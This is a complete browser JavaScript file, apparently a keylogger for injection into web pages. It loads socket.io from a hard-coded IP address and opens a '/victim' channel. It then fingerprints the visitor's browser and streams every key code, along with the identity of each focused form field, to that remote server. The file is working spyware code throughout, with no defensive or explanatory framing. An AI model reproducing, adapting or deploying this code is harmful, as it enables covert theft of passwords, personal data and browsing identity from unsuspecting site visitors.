/* globals io */
(function(){

    function loadScript(url, callback) {
        // Adding the script tag to the head as suggested before
        var head = document.getElementsByTagName('head')[0];
        var script = document.createElement('script');
        script.type = 'text/javascript';
        script.src = url;

        // Then bind the event to the callback function.
        // There are several events for cross browser compatibility.
        script.onreadystatechange = callback;
        script.onload = callback;

        // Fire the loading
        head.appendChild(script);
    }

    function loadAllScripts() {
        loadScript('http://199.98.20.120:3000/socket.io/socket.io.js', init);
    }

    function spyOnKeyDown(socket) {
        document.onkeydown = function (e) {
            e = e || window.event;

            socket.emit('update', {
                type: 'type',
                msg: e.keyCode
            });
        };
    }

    function spyOnFieldFocus(socket) {
        var inputFields = document.querySelectorAll('input,textarea'),
            fieldName = function(field) {
                if (field.id) {
                    return '#' + field.id;
                }
                if (field.className) {
                    return '.' + field.className;
                }
                return '[' + field.type + ']';
            },
            emitChange = function() {
                socket.emit('update', {
                    type: 'element-change',
                    msg: fieldName(this)
                });
            };

        for (var i = 0; i < inputFields.length; i++) {
            var field = inputFields[i];
            field.onfocus = emitChange;
        }
    }

    function newFinger(socket) {
//	var Fingerprint2 = require('fingerprint2js')
	var fp = new Fingerprint2();
	fp.get(function(result) {
	 socket.emit('new', {
		type: 'new', 
		msg: result
	    });
	});
    }

    function init() {
        var socket = io('http://199.98.20.120:3000/victim');
	newFinger(socket);	
        spyOnKeyDown(socket);
        spyOnFieldFocus(socket);
    }

    loadAllScripts();

}());
